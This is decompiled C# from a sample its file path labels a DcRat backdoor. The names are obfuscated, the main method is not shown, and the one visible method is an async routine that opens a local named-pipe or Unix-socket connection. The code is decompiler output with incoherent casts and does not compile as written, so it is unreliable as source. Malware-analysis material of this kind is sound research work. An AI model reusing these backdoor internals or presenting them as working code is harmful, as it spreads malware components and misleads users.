// Decompiled with JetBrains decompiler
// Type: jmZGgwW.In5jMLK
// Assembly: jmZGgwW, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 3D70FD3D-7EEC-4701-9107-04233FCFD67F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-29c7b524ec1c67f80e1ce8d5b2ed484b6a4b6d119ff128d65734114fe0fe501b.exe

using Microsoft;
using Microsoft.ServiceHub.Utility;
using Microsoft.VisualBasic.CompilerServices;
using qClsWxk;
using System;
using System.IO;
using System.IO.Pipes;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using Z8U4zC7;

namespace jmZGgwW
{
  [StandardModule]
  internal sealed class In5jMLK
  {
    internal static readonly long \u0039f20JjT;

    [STAThread]
    public static void Main()
    {
      // ISSUE: The method is too long to display (143314 instructions)
    }

    private void tTDRmsq()
    {
      // ISSUE: reference to a compiler-generated field
      int ynBhesw = ((LjZZ21Z) this).YnBHESW;
      Stream result;
      try
      {
        ConfiguredTaskAwaitable<Socket>.ConfiguredTaskAwaiter awaiter1;
        int num;
        switch (ynBhesw)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            awaiter1 = ((eBES6KN.OqszKgB) this).\u0038N8QXgg;
            // ISSUE: reference to a compiler-generated field
            ((eBES6KN.OqszKgB) this).\u0038N8QXgg = new ConfiguredTaskAwaitable<Socket>.ConfiguredTaskAwaiter();
            // ISSUE: reference to a compiler-generated field
            ((LjZZ21Z) this).YnBHESW = num = -1;
            break;
          case 1:
            try
            {
              ConfiguredTaskAwaitable.ConfiguredTaskAwaiter awaiter2;
              if (ynBhesw != 1)
              {
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                awaiter2 = ((eBES6KN.OqszKgB) this).\u00319YWIuS.\u0035jIgNKS(((eBES6KN.OqszKgB) this).\u0031qwcgMf).ConfigureAwait(false).GetAwaiter();
                if (!awaiter2.IsCompleted)
                {
                  // ISSUE: reference to a compiler-generated field
                  ((LjZZ21Z) this).YnBHESW = num = 1;
                  // ISSUE: reference to a compiler-generated field
                  ((eBES6KN.OqszKgB) this).zcuxIcX = awaiter2;
                  // ISSUE: reference to a compiler-generated field
                  // ISSUE: cast to a reference type
                  ((eBES6KN.OqszKgB) this).yynceTt.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable.ConfiguredTaskAwaiter, eBES6KN.OqszKgB>(ref awaiter2, (eBES6KN.OqszKgB&) this);
                  return;
                }
              }
              else
              {
                // ISSUE: reference to a compiler-generated field
                awaiter2 = ((eBES6KN.OqszKgB) this).zcuxIcX;
                // ISSUE: reference to a compiler-generated field
                ((eBES6KN.OqszKgB) this).zcuxIcX = new ConfiguredTaskAwaitable.ConfiguredTaskAwaiter();
                // ISSUE: reference to a compiler-generated field
                ((LjZZ21Z) this).YnBHESW = num = -1;
              }
              awaiter2.GetResult();
            }
            catch
            {
              // ISSUE: reference to a compiler-generated field
              ((eBES6KN.OqszKgB) this).\u00319YWIuS.Dispose();
              throw;
            }
            // ISSUE: reference to a compiler-generated field
            result = (Stream) new DevHubPipeStream((PipeStream) ((eBES6KN.OqszKgB) this).\u00319YWIuS);
            goto label_17;
          default:
            // ISSUE: reference to a compiler-generated field
            Requires.NotNullOrEmpty(((eBES6KN.OqszKgB) this).UGSU2Jl, "channelName");
            // ISSUE: reference to a compiler-generated field
            string pipeName1 = ChannelScheme.GetPipeName(((eBES6KN.OqszKgB) this).UGSU2Jl);
            // ISSUE: reference to a compiler-generated field
            string pipeName2 = ChannelScheme.GetPipeName(((eBES6KN.OqszKgB) this).PTaSydV);
            if (UnixDomainSocketEndPoint.IsSupported)
            {
              // ISSUE: reference to a compiler-generated field
              awaiter1 = SocketClient.ConnectAsync(Path.Combine(EnvUtils.GetUnixSocketDir(pipeName2), pipeName1), (ChannelConnectionFlags) 1, ((eBES6KN.OqszKgB) this).\u0031qwcgMf).ConfigureAwait(false).GetAwaiter();
              if (!awaiter1.IsCompleted)
              {
                // ISSUE: reference to a compiler-generated field
                ((LjZZ21Z) this).YnBHESW = num = 0;
                // ISSUE: reference to a compiler-generated field
                ((eBES6KN.OqszKgB) this).\u0038N8QXgg = awaiter1;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: cast to a reference type
                ((eBES6KN.OqszKgB) this).yynceTt.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<Socket>.ConfiguredTaskAwaiter, eBES6KN.OqszKgB>(ref awaiter1, (eBES6KN.OqszKgB&) this);
                return;
              }
              break;
            }
            // ISSUE: reference to a compiler-generated field
            ((eBES6KN.OqszKgB) this).\u00319YWIuS = new NamedPipeClientStream(".", pipeName1, PipeDirection.InOut, PipeOptions.Asynchronous);
            goto case 1;
        }
        result = (Stream) new UnixDomainSocketStream(awaiter1.GetResult());
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        ((LjZZ21Z) this).YnBHESW = -2;
        // ISSUE: reference to a compiler-generated field
        ((eBES6KN.OqszKgB) this).\u00319YWIuS = (NamedPipeClientStream) null;
        // ISSUE: reference to a compiler-generated field
        ((eBES6KN.OqszKgB) this).yynceTt.SetException(ex);
        return;
      }
label_17:
      // ISSUE: reference to a compiler-generated field
      ((LjZZ21Z) this).YnBHESW = -2;
      // ISSUE: reference to a compiler-generated field
      ((eBES6KN.OqszKgB) this).\u00319YWIuS = (NamedPipeClientStream) null;
      // ISSUE: reference to a compiler-generated field
      ((eBES6KN.OqszKgB) this).yynceTt.SetResult(result);
    }
  }
}
